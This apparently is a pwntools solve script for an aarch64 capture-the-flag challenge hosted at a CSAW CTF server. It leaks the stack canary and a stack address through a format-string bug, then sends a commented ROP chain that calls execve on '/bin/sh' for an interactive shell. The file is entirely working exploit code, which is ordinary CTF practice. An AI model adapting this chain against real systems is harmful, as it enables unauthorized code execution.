from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chal", checksec=False)

context.binary = exe

serv = "chals.ctf.csaw.io"
port = 21003

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    elif args.GDB:
        r = process(['qemu-aarch64', '-g', '1234', './chal'])
        gdb.attach(r, gdbscript="""
            target remote :1234
            b *0x4008d4
        """)
        # ---- IMPORTANT ----
        # In gdb, run `file ./chal` to get symbols!
    else: 
        r = process(['qemu-aarch64', './chal'])            
    return r

r = conn()

def main():

    # Canary leak and stack leak
    sla(b'quility!', b'%25$p%26$p')
    rcu(b']: ')
    fmtstr_output = rcl().strip()
    canary = int(b'0x' + fmtstr_output.split(b'0x')[1], 16)
    buf_base = int(b'0x' + fmtstr_output.split(b'0x')[2], 16) - 0xa0
    log.info(f"{hex(canary)=}")
    log.info(f"{hex(buf_base)=}")

    # ----- Gadgets used ----- 

    # --- X0 CONTROL ---
    # Load x19, x20, x21, x22, x23, x24
    # 0x00000000004409c0 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret

    # Some loads into registers, move x20 into x0 before more loads into registers
    # 0x000000000042f584 : mov x0, x20 ; ldp x19, x20, [sp, #0x10] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret

    # --- X8 CONTROL ---
    # Powerful gadget that loads x0-x9 if you control x16
    # 0x00000000004401f0 : ldp x0, x1, [sp, #0x40] ; ldp x2, x3, [sp, #0x30] ; ldp x4, x5, [sp, #0x20] ; ldp x6, x7, [sp, #0x10] ; ldp x8, x9, [sp], #0xd0 ; ldp x17, x30, [sp], #0x10 ; br x16

    # --- X16 CONTROL ---
    # If you load x16 with the correct gadget from x0, this can actually chain to the next gadget properly
    # 0x000000000044bf74 : mov x16, x0 ; br x16

    # -------------------------------------- 


    # ----- ROP -----
    # Goals: 
    # 1. Set x8 to 0xdd (execve syscall)
    # 2. Set x0 to arb value (i.e. /bin/sh on stack)
    # 3. Set x1 to 0

    # High level idea:
    # 1. We want to build up to the gadget at 0x4401f0 which lets us control x0, x1 and x8
    # 2. To do that, since it will `br x16``, we need to control x16
    # 3. So we first place a `ldp x29, x30, [sp], #0x20 ; ret` gadget address into x16 through x0
    # ---------------

    payload = b''.join([
        b'/bin/sh\x00',
        b'A' * 0x80,
        p64(canary),
        p64(0), # x29
        p64(0x4409c0) # x30
    ])

    # Load the address of a `ldp x29, x30, [sp], #0x20 ; ret` gadget into x16 via x0 (x0 loaded via x20)
    provide_sp_and_ret_gadget = 0x44bc04
    payload += b''.join([ # Executing 0x00000000004409c0 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret
        p64(0), # x29
        p64(0x42f584), #x30
        p64(1), # x19
        p64(provide_sp_and_ret_gadget), # x20
        p64(3), # x21
        p64(4), # x22
        p64(5), # x23
        p64(6), # x24
        p64(7), # x25
        b'A' * 0x8
    ])
    payload += b''.join([ # Executing 0x000000000042f584 : mov x0, x20 ; ldp x19, x20, [sp, #0x10] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret
        p64(0), # x29
        p64(0x44bf74), # x30
        p64(1), # x19
        p64(2), # x20
        b'A' * 0x20,
        p64(3), # x25
        b'A' * 0x8 
    ])
    payload += b''.join([ # Executing 0x000000000044bf74 : mov x16, x0 ; br x16
        p64(0), # x29
        p64(0x4401f0), # x30
        b'A' * 0x10
    ])

    # Use a powerful gadget to control x1-x8
    syscall_gadget = 0x416130
    payload += b''.join([ # Executing 0x00000000004401f0 : ldp x0, x1, [sp, #0x40] ; ldp x2, x3, [sp, #0x30] ; ldp x4, x5, [sp, #0x20] ; ldp x6, x7, [sp, #0x10] ; ldp x8, x9, [sp], #0xd0 ; ldp x17, x30, [sp], #0x10 ; br x16
        p64(0xdd), # x8
        p64(0) * 7, # x9, x6, x7, x4, x5, x3, x2
        p64(buf_base), # x0
        p64(0), # x1
        b'A' * (0xd0 + 0x10 - 0x50),
        p64(0), # x29
        p64(syscall_gadget) # x30
    ])

    snd(payload)
    
    r.interactive()

if __name__ == "__main__":
    main()